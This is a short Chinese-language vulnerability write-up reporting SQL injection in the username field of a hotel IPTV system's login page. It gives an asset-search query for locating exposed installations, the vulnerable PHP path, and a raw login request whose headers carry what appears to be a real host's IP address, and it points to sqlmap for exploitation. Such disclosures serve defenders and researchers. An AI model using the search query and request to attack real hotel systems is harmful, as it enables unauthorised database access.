# 深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统存在sql注入

# 一、漏洞简介
深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统存在sql注入。

# 二、影响版本
+ 酒店智慧营销IPTV系统

# 三、资产测绘
+ hunter`web.title:"登录 - 酒店智慧营销IPTV系统"`
+ 特征

![1698932892581-a474c41f-686e-4883-b314-0993a114237b.png](./img/nuMvHSl80FyC2LGY/1698932892581-a474c41f-686e-4883-b314-0993a114237b-672455.png)

# 四、漏洞复现
漏洞位置：

```plain
/xsiptva/cniptv/userlogin.php
```

![1698932929487-4f3b4ae5-dfcf-47c5-b276-1d8ce2f24fb4.png](./img/nuMvHSl80FyC2LGY/1698932929487-4f3b4ae5-dfcf-47c5-b276-1d8ce2f24fb4-780511.png)

登录界面存在sql注入，username参数sql注入漏洞

```plain
POST /xsiptva/cniptv/userlogin.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://1.69.37.165:8880
Connection: close
Referer: http://1.69.37.165:8880/xsiptva/cniptv/userlogin.php
Cookie: PHPSESSID=8kvgnj6bg3vr7ljf12c861s3i4
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

sqlmap

![1698932982510-115d9e83-2ffa-4ee7-9f81-45fb28de0f62.png](./img/nuMvHSl80FyC2LGY/1698932982510-115d9e83-2ffa-4ee7-9f81-45fb28de0f62-596961.png)



> 更新: 2024-02-29 23:55:47  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bkkb8ze783s6xqap>